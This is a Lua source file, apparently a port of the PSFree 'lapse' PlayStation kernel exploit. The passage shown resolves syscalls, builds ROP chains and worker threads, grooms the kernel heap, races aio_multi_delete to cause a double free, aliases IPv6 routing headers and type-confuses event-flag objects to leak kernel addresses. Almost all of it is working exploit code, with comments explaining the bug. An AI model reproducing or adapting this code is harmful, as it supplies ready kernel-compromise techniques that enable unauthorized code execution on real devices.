--[[
    Copyright (C) 2025 anonymous

    This file `lapse.lua` contains a derivative work of `lapse.mjs`, 
    which originally is a part of PSFree.
    
    Source: https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/psfree-1.5rc1.7z

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]



-- configuration

MAIN_CORE = 4
MAIN_RTPRIO = 0x100

NUM_WORKERS = 2
NUM_GROOMS = 0x200
NUM_HANDLES = 0x100
NUM_RACES = 100
NUM_SDS = 64
NUM_SDS_ALT = 48
NUM_ALIAS = 100
LEAK_LEN = 16
NUM_LEAKS = 16
NUM_CLOBBERS = 8




syscall.resolve({
    unlink = 0xa,

    socket = 0x61,
    connect = 0x62,
    bind = 0x68,
    setsockopt = 0x69,
    listen = 0x6a,
    
    getsockopt = 0x76,
    socketpair = 0x87,
    thr_self = 0x1b0,
    thr_exit = 0x1af,
    sched_yield = 0x14b,
    thr_new = 0x1c7,
    cpuset_getaffinity = 0x1e7,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,

    evf_create = 0x21a,
    evf_delete = 0x21b,
    evf_set = 0x220,
    evf_clear = 0x221,

    thr_suspend_ucontext = 0x278,
    thr_resume_ucontext = 0x279,

    aio_multi_delete = 0x296,
    aio_multi_wait = 0x297,
    aio_multi_poll = 0x298,
    aio_multi_cancel = 0x29a,
    aio_submit_cmd = 0x29d,
    
    kexec = 0x295,
})



-- misc functions

function wait_for(addr, threshold)
    while memory.read_qword(addr):tonumber() ~= threshold do
        sleep(1, "ns")
    end
end




-- cpu related functions

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function get_core_index(mask_addr)
    local num = memory.read_dword(mask_addr):tonumber()
    local position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    end
    return position - 1
end

function get_current_core()
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
end

function rtprio(type, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio or 0)  -- current_prio
    syscall.rtprio_thread(type, 0, rtprio):tonumber()
    if type == RTP_LOOKUP then
        return memory.read_word(rtprio + 0x2):tonumber() -- current_prio
    end
end

function set_rtprio(prio)
    rtprio(RTP_SET, prio)
end

function get_rtprio()
    return rtprio(RTP_LOOKUP)
end




-- rop functions

function rop_get_current_core(chain, mask)
    local level = 3
    local which = 1
    local id = -1
    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
end

function rop_pin_to_core(chain, core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
end

function rop_set_rtprio(chain, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
end




--
-- primitive thread class
--
-- use thr_new to spawn new thread
--
-- only bare syscalls are supported. any attempt to call into few libc 
-- fns (such as printf/puts) will result in a crash
--

prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()

    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)
    
    -- get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)

    prim_thread.initialized = true
end

function prim_thread:prepare_structure()

    local jmpbuf = memory.alloc(0x60)

    -- skeleton jmpbuf
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr

    -- prep structure for thr_new

    local stack_size = 0x400
    local tls_size = 0x40
    
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)

    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid

    self.ready = true
end


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    end

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end

    -- exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    local self = setmetatable({}, prim_thread)    
    
    self.chain = chain

    return self
end

-- run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    end

    -- spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    end

    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()
    
    return self.tid
end


-- sys/socket.h
AF_UNIX = 1
AF_INET = 2
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_DGRAM = 2
SOL_SOCKET = 0xffff
SO_REUSEADDR = 4
SO_LINGER = 0x80

-- netinet/in.h
IPPROTO_TCP = 6
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
INADDR_ANY = 0

-- netinet/tcp.h
TCP_INFO = 0x20
size_tcp_info = 0xec

-- netinet/tcp_fsm.h
TCPS_ESTABLISHED = 4

-- netinet6/in6.h
IPV6_2292PKTOPTIONS = 25
IPV6_PKTINFO = 46
IPV6_NEXTHOP = 48
IPV6_RTHDR = 51
IPV6_TCLASS = 61

-- sys/cpuset.h
CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1

-- sys/mman.h
MAP_SHARED = 1
MAP_FIXED = 0x10

-- sys/rtprio.h
RTP_SET = 1
RTP_PRIO_REALTIME = 2


--

AIO_CMD_READ = 1
AIO_CMD_WRITE = 2
AIO_CMD_FLAG_MULTI = 0x1000
AIO_CMD_MULTI_READ = bit32.bor(AIO_CMD_FLAG_MULTI, AIO_CMD_READ)
AIO_STATE_COMPLETE = 3
AIO_STATE_ABORTED = 4

-- max number of requests that can be created/polled/canceled/deleted/waited
MAX_AIO_IDS = 0x80

-- the various SceAIO syscalls that copies out errors/states will not check if
-- the address is NULL and will return EFAULT. this dummy buffer will serve as
-- the default argument so users don't need to specify one
AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)


SCE_KERNEL_ERROR_ESRCH = 0x80020003


-- multi aio related functions


-- int aio_submit_cmd(
--     u_int cmd,
--     SceKernelAioRWRequest reqs[],
--     u_int num_reqs,
--     u_int prio,
--     SceKernelAioSubmitId ids[]
-- );
function aio_submit_cmd(cmd, reqs, num_reqs, ids)
    local ret = syscall.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids):tonumber()
    if ret == -1 then
        error("aio_submit_cmd() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_delete(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int sce_errors[]
-- );
function aio_multi_delete(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_delete(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_delete() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_poll(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_poll(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_poll(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_poll() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_cancel(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_cancel(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_cancel(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_cancel() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_wait(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[],
--     // SCE_KERNEL_AIO_WAIT_*
--     uint32_t mode,
--     useconds_t *timeout
-- );
function aio_multi_wait(ids, num_ids, states, mode, timeout)

    states = states or AIO_ERRORS
    mode = mode or 1
    timeout = timeout or 0

    local ret = syscall.aio_multi_wait(ids, num_ids, states, mode, timeout):tonumber()
    if ret == -1 then
        error("aio_multi_wait() error: " .. get_error_string())
    end
    return ret
end

function new_socket()
    local sd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    if sd == -1 then
        error("new_socket() error: " .. get_error_string())
    end
    return sd
end

function new_tcp_socket()
    local sd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sd == -1 then
        error("new_tcp_socket() error: " .. get_error_string())
    end
    return sd
end

function ssockopt(sd, level, optname, optval, optlen)
    if syscall.setsockopt(sd, level, optname, optval, optlen):tonumber() == -1 then
        error("setsockopt() error: " .. get_error_string())
    end
end

function gsockopt(sd, level, optname, optval, optlen)
    local size = memory.alloc(8)
    memory.write_dword(size, optlen)
    if syscall.getsockopt(sd, level, optname, optval, size):tonumber() == -1 then
        error("getsockopt() error: " .. get_error_string())
    end
    return memory.read_dword(size):tonumber()
end

function make_reqs1(num_reqs)
    local reqs1 = memory.alloc(0x28 * num_reqs)
    for i=0,num_reqs-1 do
        memory.write_dword(reqs1 + i*0x28 + 0x20, -1) -- fd
    end
    return reqs1
end

function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd)
    
    loops = loops or 1
    cmd = cmd or AIO_CMD_READ
    if multi == nil then multi = true end

    local step = 4 * (multi and num_reqs or 1)
    cmd = bit32.bor(cmd, (multi and AIO_CMD_FLAG_MULTI or 0))
    
    for i=0, loops-1 do
        aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))
    end
end

function cancel_aios(ids, num_ids)

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        aio_multi_cancel(ids + (i*4*len), len)
    end

    if rem > 0 then
        aio_multi_cancel(ids + (num_batches*4*len), rem)
    end
end

function free_aios(ids, num_ids, do_cancel)

    if do_cancel == nil then do_cancel = true end

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        local addr = ids + (i*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end

    if rem > 0 then
        local addr = ids + (num_batches*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end
end

function free_aios2(ids, num_ids)
    free_aios(ids, num_ids, false)
end



-- exploit related functions

function setup(block_fd)

    -- 1. block AIO

    -- this part will block the worker threads from processing entries so that we may cancel them instead.
    -- this is to work around the fact that aio_worker_entry2() will fdrop() the file associated with the aio_entry on ps5.
    -- we want aio_multi_delete() to call fdrop()

    local reqs1 = memory.alloc(0x28 * NUM_WORKERS)
    local block_id = memory.alloc(4)

    for i=0,NUM_WORKERS-1 do
        memory.write_dword(reqs1 + i*0x28 + 8, 1)  -- nbyte
        memory.write_dword(reqs1 + i*0x28 + 0x20, block_fd)  -- fd
    end

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id)

    -- 2. heap grooming

    -- chosen to maximize the number of 0x80 malloc allocs per submission
    local num_reqs = 3
    local groom_ids = memory.alloc(4 * NUM_GROOMS)
    local greqs = make_reqs1(num_reqs)

    -- allocate enough so that we start allocating from a newly created slab
    spray_aio(NUM_GROOMS, greqs, num_reqs, groom_ids, false)
    cancel_aios(groom_ids, NUM_GROOMS)

    return block_id, groom_ids
end

pipe_buf = memory.alloc(8)
ready_signal = memory.alloc(0x8)
deletion_signal = memory.alloc(0x8)

function reset_race_state()
    
    -- clean up race states
    memory.write_qword(ready_signal, 0)
    memory.write_qword(deletion_signal, 0)
end

function prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)

    local chain = ropchain()

    -- set worker thread core to be the same as main thread core so they 
    -- will use similar per-cpu freelist bucket
    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, MAIN_RTPRIO)

    -- mark thread as ready
    chain:push_write_qword_memory(ready_signal, 1)

    -- this will block the thread until it is signalled to run
    chain:push_syscall(syscall.read, pipe_read_fd, pipe_buf, 1)

    -- do the deletion op
    chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)

    -- mark deletion as finished
    chain:push_write_qword_memory(deletion_signal, 1)

    return chain
end


-- summary of the bug at aio_multi_delete():
--
-- void free_queue_entry(struct aio_entry *reqs2)
-- {
--     if (reqs2->ar2_spinfo != NULL) {
--         printf("[0]%s() line=%d Warning !! split info is here\n", __func__, __LINE__);
--     }
--     if (reqs2->ar2_file != NULL) {
--         // we can potentially delay .fo_close()
--         fdrop(reqs2->ar2_file, curthread);
--         reqs2->ar2_file = NULL;
--     }
--     // can double free on reqs2
--     // allocated size is 0x58 which falls onto malloc 0x80 zone
--     free(reqs2, M_AIO_REQS2);
-- }
--
-- int _aio_multi_delete(struct thread *td, SceKernelAioSubmitId ids[], u_int num_ids, int sce_errors[])
-- {
--     // ...
--     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
--     // ...
--     u_int rem_ids = obj->ao_rem_ids;
--     if (rem_ids != 1) {
--         // BUG: wlock not acquired on this path
--         obj->ao_rem_ids = --rem_ids;
--         // ...
--         free_queue_entry(obj->ao_entries[req_idx]);
--         // the race can crash because of a NULL dereference since this path
--         // doesn't check if the array slot is NULL so we delay
--         // free_queue_entry()
--         obj->ao_entries[req_idx] = NULL;
--     } else {
--         // ...
--     }
--     // ...
-- }
function race_one(request_addr, tcp_sd, sds)

    reset_race_state()

    local sce_errs = memory.alloc(8)
    memory.write_dword(sce_errs, -1)
    memory.write_dword(sce_errs+4, -1)

    local pipe_read_fd, pipe_write_fd = create_pipe()

    -- prepare ropchain to race for aio_multi_delete
    local delete_chain = prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)

    -- spawn worker thread
    local thr = prim_thread:new(delete_chain)
    local thr_tid = thr:run()

    -- wait for the worker thread to ready
    wait_for(ready_signal, 1)

    local suspend_chain = ropchain()

    -- notify worker thread to resume
    suspend_chain:push_syscall(syscall.write, pipe_write_fd, pipe_buf, 1)

    -- yield and hope the scheduler runs the worker next.
    -- the worker will then sleep at soclose() and hopefully we run next
    suspend_chain:push_syscall(syscall.sched_yield)

    -- if we get here and the worker hasn't been reran then we can delay the 
    -- worker's execution of soclose() indefinitely
    suspend_chain:push_syscall_with_ret(syscall.thr_suspend_ucontext, thr_tid)
    
    suspend_chain:restore_through_longjmp()
    suspend_chain:execute_through_coroutine()

    local suspend_res = memory.read_qword(suspend_chain.retval_addr[1]):tonumber()

    -- local suspend_res = syscall.thr_suspend_ucontext(thr_tid):tonumber()
    printf("suspend %s: %d", hex(thr_tid), suspend_res)

    local poll_err = memory.alloc(4)
    aio_multi_poll(request_addr, 1, poll_err)
    local poll_res = memory.read_dword(poll_err):tonumber()
    printf("poll: %s", hex(poll_res))

    local info_buf = memory.alloc(0x100)
    local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100)

    if info_size ~= size_tcp_info then
        printf("info size isn't " .. size_tcp_info .. ": " .. info_size)
    end

    local tcp_state = memory.read_byte(info_buf):tonumber()
    print("tcp state: " .. hex(tcp_state))

    local won_race = false

    -- to win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if poll_res ~= SCE_KERNEL_ERROR_ESRCH and tcp_state ~= TCPS_ESTABLISHED then
        -- PANIC: double free on the 0x80 malloc zone.
        -- important kernel data may alias
        aio_multi_delete(request_addr, 1, sce_errs)
        won_race = true
    end

    -- resume the worker thread
    local resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
    printf("resume %s: %d", hex(thr_tid), resume)

    wait_for(deletion_signal, 1)

    if won_race then

        local err_main_thr = memory.read_dword(sce_errs)
        local err_worker_thr = memory.read_dword(sce_errs+4)
        printf("sce_errs: %s %s", hex(err_main_thr), hex(err_worker_thr))

        -- if the code has no bugs then this isn't possible but we keep the check for easier debugging
        -- NOTE: both must be equal 0 for the double free to works
        if err_main_thr ~= err_worker_thr then
            error("bad won")
        end

        -- RESTORE: double freed memory has been reclaimed with harmless data
        -- PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs(sds)    
    end

    return nil
end


function build_rthdr(buf, size)

    local len = bit32.band(
        bit32.rshift(size, 3) - 1,
        bit32.bnot(1)
    )
    size = bit32.lshift(len + 1, 3)

    memory.write_byte(buf, 0) -- ip6r_nxt
    memory.write_byte(buf+1, len) -- ip6r_len
    memory.write_byte(buf+2, 0) -- ip6r_type
    memory.write_byte(buf+3, bit32.rshift(len, 1)) -- ip6r_segleft

    return size
end


function get_rthdr(sd, buf, len)
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

function set_rthdr(sd, buf, len)
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

function free_rthdrs(sds)
    for _, sd in ipairs(sds) do
        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
    end
end


function make_aliased_rthdrs(sds)

    local marker_offset = 4
    local size = 0x80
    local buf = memory.alloc(size)
    local rsize = build_rthdr(buf, size)

    for loop=1,NUM_ALIAS do

        for i=1, NUM_SDS do
            memory.write_dword(buf + marker_offset, i)
            set_rthdr(sds[i], buf, rsize)
        end

        for i=1, NUM_SDS do
            get_rthdr(sds[i], buf, size)
            local marker = memory.read_dword(buf + marker_offset):tonumber()
            -- printf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
            if marker ~= i then
                local sd_pair = { sds[i], sds[marker] }
                printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
                table.remove(sds, marker)
                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
                free_rthdrs(sds)
                for i=1,2 do
                    table.insert(sds, new_socket())
                end
                return sd_pair
            end
        end
    end

    errorf("failed to make aliased rthdrs: size %s", hex(size))
end





function double_free_reqs2(sds)

    -- 1. setup socket to wait for soclose

    local function htons(port)
        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
    end

    local function aton(ip)
        local a, b, c, d = ip:match("(%d+).(%d+).(%d+).(%d+)")
        return bit32.bor(bit32.lshift(d, 24), bit32.lshift(c, 16), bit32.lshift(b, 8), a)
    end

    local server_addr = memory.alloc(16)

    memory.write_byte(server_addr + 1, AF_INET) -- sin_family
    memory.write_word(server_addr + 2, htons(5050)) -- sin_port
    memory.write_dword(server_addr + 4, aton("127.0.0.1"))

    local sd_listen = new_tcp_socket()
    printf("sd_listen: %d", sd_listen)

    local enable = memory.alloc(4)
    memory.write_dword(enable, 1)

    ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4)
    
    if syscall.bind(sd_listen, server_addr, 16):tonumber() == -1 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(sd_listen, 1):tonumber() == -1 then
        error("listen() error: " .. get_error_string())
    end

    -- 2. start the race

    local num_reqs = 3
    local which_req = num_reqs - 1
    local reqs1 = make_reqs1(num_reqs)
    local aio_ids = memory.alloc(4 * num_reqs)
    local req_addr = aio_ids + (4 * which_req)
    local cmd = AIO_CMD_MULTI_READ

    for i=1,NUM_RACES do

        local sd_client = new_tcp_socket()
        printf("sd_client: %d", sd_client)

        if syscall.connect(sd_client, server_addr, 16):tonumber() == -1 then
            error("connect() error: " .. get_error_string())
        end

        local sd_conn = syscall.accept(sd_listen, 0, 0):tonumber()
        if sd_conn == -1 then
            error("accept() error: " .. get_error_string())
        end

        printf("sd_conn: %d", sd_conn)

        local linger_buf = memory.alloc(8)
        memory.write_dword(linger_buf, 1) -- l_onoff - linger active
        memory.write_dword(linger_buf+4, 1) -- l_linger - how many seconds to linger for

        -- force soclose() to sleep
        ssockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8)

        memory.write_dword(reqs1 + which_req*0x28 + 0x20, sd_client)

        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
        aio_multi_cancel(aio_ids, num_reqs)
        aio_multi_poll(aio_ids, num_reqs)

        -- drop the reference so that aio_multi_delete() will trigger _fdrop()
        syscall.close(sd_client)

        local res = race_one(req_addr, sd_conn, sds)

        -- MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        -- twice. this will leave one request undeleted
        aio_multi_delete(aio_ids, num_reqs)
        syscall.close(sd_conn)

        if res then
            printf("won race at attempt %d", i)
            syscall.close(sd_listen)
            return res
        end
    end

    error("failed aio double free")
end



function new_evf(name, flags)
    local ret = syscall.evf_create(name, 0, flags):tonumber()
    if ret == -1 then
        error("evf_create() error: " .. get_error_string())
    end
    return ret
end

function set_evf_flags(id, flags)
    if syscall.evf_clear(id, 0):tonumber() == -1 then
        error("evf_clear() error: " .. get_error_string())
    end
    if syscall.evf_set(id, flags):tonumber() == -1 then
        error("evf_set() error: " .. get_error_string())
    end
end

function free_evf(id)
    if syscall.evf_delete(id):tonumber() == -1 then
        error("evf_delete() error: " .. get_error_string())
    end
end



function verify_reqs2(addr, cmd)

    -- reqs2.ar2_cmd
    if memory.read_dword(addr):tonumber() ~= cmd then
        return false
    end

    -- heap_prefixes is a array of randomized prefix bits from a group of heap
    -- address candidates. if the candidates truly are from the heap, they must
    -- share a common prefix
    local heap_prefixes = {}

    -- check if offsets 0x10 to 0x20 look like a kernel heap address
    for i = 0x10, 0x20, 8 do
        if memory.read_word(addr + i + 6):tonumber() ~= 0xffff then
            return false
        end
        table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
    end

    -- check reqs2.ar2_result.state
    -- state is actually a 32-bit value but the allocated memory was initialized with zeros.
    -- all padding bytes must be 0 then
    local state1 = memory.read_dword(addr + 0x38):tonumber()
    local state2 = memory.read_dword(addr + 0x38 + 4):tonumber()
    if not (state1 > 0 and state1 <= 4) or state2 ~= 0 then
        return false
    end

    -- reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
    if memory.read_qword(addr + 0x40) ~= uint64(0) then
        return false
    end

    -- check if offsets 0x48 to 0x50 look like a kernel address
    for i = 0x48, 0x50, 8 do
        if memory.read_word(addr + i + 6):tonumber() == 0xffff then
            -- don't push kernel ELF addresses
            if memory.read_word(addr + i + 4):tonumber() ~= 0xffff then
                table.insert(heap_prefixes, memory.read_word(addr + i + 4):tonumber())
            end
        -- offset 0x48 can be NULL
        elseif (i == 0x50) or (memory.read_qword(addr + i) ~= uint64(0)) then
            return false
        end
    end

    if #heap_prefixes < 2 then
        return false
    end

    local first_prefix = heap_prefixes[1]
    for idx = 2, #heap_prefixes do
        if heap_prefixes[idx] ~= first_prefix then
            return false
        end
    end

    return true
end



function leak_kernel_addrs(sd_pair, sds)

    local sd = sd_pair[1]
    local buflen = 0x80 * LEAK_LEN
    local buf = memory.alloc(buflen)

    -- type confuse a struct evf with a struct ip6_rthdr.
    -- the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
    print("confuse evf with rthdr")

    local name = memory.alloc(1)

    -- free one of rthdr
    syscall.close(sd_pair[2])

    local evf = nil
    for i=1, NUM_ALIAS do

        local evfs = {}

        -- reclaim freed rthdr with evf object
        for j=1, NUM_HANDLES do
            local evf_flags = bit32.bor(0xf00, bit32.lshift(j, 16))
            table.insert(evfs, new_evf(name, evf_flags))
        end

        get_rthdr(sd, buf, 0x80)

        -- for simplicty, we'll assume i < 2**16
        local flag = memory.read_dword(buf):tonumber()

        if bit32.band(flag, 0xf00) == 0xf00 then

            local idx = bit32.rshift(flag, 16) 
            local expected_flag = bit32.bor(flag, 1)
            
            evf = evfs[idx]

            set_evf_flags(evf, expected_flag)
            get_rthdr(sd, buf, 0x80)

            local val = memory.read_dword(buf):tonumber()
            if val == expected_flag then
                table.remove(evfs, idx)
            else
                evf = nil
            end
        
        end

        for _, each_evf in ipairs(evfs) do
            free_evf(each_evf)
        end

        if evf ~= nil then
            printf("confused rthdr and evf at attempt: %d", i)
            break
        end
    end

    if evf == nil then
        error("failed to confuse evf and rthdr")
    end

    -- ip6_rthdr and evf obj are overlapped by now
    -- enlarge ip6_rthdr by writing to its len field by setting the evf's flag
    set_evf_flags(evf, bit32.lshift(0xff, 8))

    -- fields we use from evf (number before the field is the offset in hex):
    -- struct evf:
    --     0 u64 flags
    --     28 struct cv cv
    --     38 TAILQ_HEAD(struct evf_waiter) waiters

    -- evf.cv.cv_description = "evf cv"
    -- string is located at the kernel's mapped ELF file
    local kernel_addr = memory.read_qword(buf + 0x28)
    printf("\"evf cv\" string addr: %s", hex(kernel_addr))

    -- because of TAILQ_INIT(), we have:
    --
    -- evf.waiters.tqh_last == &evf.waiters.tqh_first
    --
    -- we now know the address of the kernel buffer we are leaking
    local kbuf_addr = memory.read_qword(buf + 0x40) - 0x38
    printf("kernel buffer addr: %s", hex(kbuf_addr))

    --
    -- prep to fake reqs3 (aio_batch)
    --

    local wbufsz = 0x80
    local wbuf = memory.alloc(wbufsz)
    local rsize = build_rthdr(wbuf, wbufsz)
    local marker_val = 0xdeadbeef
    local reqs3_offset = 0x10

    memory.write_dword(wbuf + 4, marker_val)
    memory.write_dword(wbuf + reqs3_offset + 0, 1)  -- .ar3_num_reqs
    memory.write_dword(wbuf + reqs3_offset + 4, 0)  -- .ar3_reqs_left
    memory.write_dword(wbuf + reqs3_offset + 8, AIO_STATE_COMPLETE)  -- .ar3_state
    memory.write_byte( wbuf + reqs3_offset + 0xc, 0)  -- .ar3_done
    memory.write_dword(wbuf + reqs3_offset + 0x28, 0x67b0000)  -- .ar3_lock.lock_object.lo_flags
    memory.write_qword(wbuf + reqs3_offset + 0x38, 1)  -- .ar3_lock.lk_lock = LK_UNLOCKED

    --
    -- prep to leak reqs2 (aio_entry)
    --

    -- 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    -- allocate reqs1 arrays at 0x100 malloc zone
    local num_elems = 6

    -- use reqs1 to fake a aio_info.
    -- set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
    local ucred = kbuf_addr + 4
    local leak_reqs = make_reqs1(num_elems)
    memory.write_qword(leak_reqs + 0x10, ucred)

    local num_loop = NUM_SDS
    local leak_ids_len = num_loop * num_elems
    local leak_ids = memory.alloc(4 * leak_ids_len)
    local step = 4 * num_elems
    local cmd = bit32.bor(AIO_CMD_WRITE, AIO_CMD_FLAG_MULTI)

    local reqs2_off = nil
    local fake_reqs3_off = nil
    local fake_reqs3_sd = nil

    for i=1, NUM_LEAKS do

        -- spray reqs2 and rthdr with fake reqs3
        for j=1, num_loop do
            memory.write_dword(wbuf + 8, j)
            aio_submit_cmd(cmd, leak_reqs, num_elems, leak_ids + ((j-1) * step))
            set_rthdr(sds[j], wbuf, rsize)
        end
        
        -- out of bound read on adjacent malloc 0x80 memory
        get_rthdr(sd, buf, buflen)

        local sd_idx = nil
        reqs2_off, fake_reqs3_off = nil, nil

        for off=0x80, buflen-1, 0x80 do

            if not reqs2_off and verify_reqs2(buf + off, AIO_CMD_WRITE) then
                reqs2_off = off
            end

            if not fake_reqs3_off then
                local marker = memory.read_dword(buf + off + 4):tonumber()
                if marker == marker_val then
                    fake_reqs3_off = off
                    sd_idx = memory.read_dword(buf + off + 8):tonumber()
                end
            end
        end

        if reqs2_off and fake_reqs3_off then
            printf("found reqs2 and fake reqs3 at attempt: %d", i)
            fake_reqs3_sd = sds[sd_idx]
            table.remove(sds, sd_idx)
            free_rthdrs(sds)
            table.insert(sds, new_socket())
            break
        end
        
        free_aios(leak_ids, leak_ids_len)
    end

    if not reqs2_off or not fake_reqs3_off then
        error("could not leak reqs2 and fake reqs3")
    end

    printf("reqs2 offset: %s", hex(reqs2_off))
    printf("fake reqs3 offset: %s", hex(fake_reqs3_off))

    get_rthdr(sd, buf, buflen)

    print("leaked aio_entry:")
    print(memory.hex_dump(buf + reqs2_off, 0x80))

    -- store for curproc leak later
    local aio_info_addr = memory.read_qword(buf + reqs2_off + 0x18)

    -- reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
    local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
